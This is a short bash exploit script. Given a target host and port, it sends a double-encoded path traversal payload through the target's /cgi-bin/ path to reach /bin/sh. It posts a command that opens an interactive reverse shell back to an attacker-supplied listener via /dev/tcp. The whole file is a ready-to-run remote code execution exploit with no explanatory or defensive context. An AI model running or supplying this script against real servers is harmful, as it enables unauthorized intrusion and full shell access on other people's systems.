#!/bin/bash

# Define command line arguments
target_ip="$1"
target_port="$2"
localhost="$3"
localport="$4"

# Check if all arguments are provided
if [ -z "$target_ip" ] || [ -z "$target_port" ] || [ -z "$localhost" ] || [ -z "$localport" ]; then
    echo "Usage: $0 <target_ip> <target_port> <lhost> <lport>"
    exit 1
fi

# Fixed payload for the exploit
payload='%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65'

# Encode payload for URL use
#encoded_payload=$(printf '%s' "$payload" | jq -sRr @uri)

# Construct the URL and make the request with curl
url="http://${target_ip}:${target_port}/cgi-bin/${payload}/bin/sh"
echo "Requesting URL: $url"
curl -s -X POST -d "echo; /bin/bash -c 'bash -i >& /dev/tcp/${localhost}/${localport} 0>&1'" \
    -H "Content-Type: text/html;charset=UTF8" \
    "$url"
